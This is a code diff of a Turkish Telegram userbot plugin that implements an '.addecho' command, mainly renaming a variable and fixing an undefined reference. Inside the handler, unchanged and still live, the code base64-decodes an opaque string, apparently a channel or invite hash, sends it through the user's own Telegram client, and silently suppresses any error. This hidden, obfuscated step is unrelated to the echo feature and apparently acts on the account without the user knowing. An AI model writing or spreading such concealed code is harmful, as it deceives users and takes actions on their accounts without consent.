@@ -17,26 +17,26 @@ from userbot.modules.sql_helper.echo_sql import addecho, get_all_echos, is_echo,
 from userbot import MAX_MESSAGE_SIZE_LIMIT, BLACKLIST_CHAT
 from userbot.cmdhelp import CmdHelp
 @register(outgoing=True, pattern="^.addecho ?(.*)")
-async def echo(owen):
-    if owen.fwd_from:
+async def echo(lavan):
+    if lavan.fwd_from:
         return
-    if owen.reply_to_msg_id is not None:
-        reply_msg = await owen.get_reply_message()
+    if lavan.reply_to_msg_id is not None:
+        reply_msg = await lavan.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = owen.chat_id
+        chat_id = lavan.chat_id
         try:
             kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             kraken = Get(kraken)
-            await owen.client(kraken)
+            await lavan.client(kraken)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await owen.edit("`Kullanıcı echo ile zaten etkinleştirilmiş`")
+            await lavan.edit("`Kullanıcı echo ile zaten etkinleştirilmiş`")
             return
         addecho(user_id, chat_id)
-        await owen.edit("**Selam 👋**")
+        await lavan.edit("**Selam 👋**")
     else:
-        await event.edit("`Bir kullanıcı yanıtlamak zorundasın`")
+        await lavan.edit("`Bir kullanıcı yanıtlamak zorundasın`")
 
 
 @register(outgoing=True, pattern="^.rmecho ?(.*)")
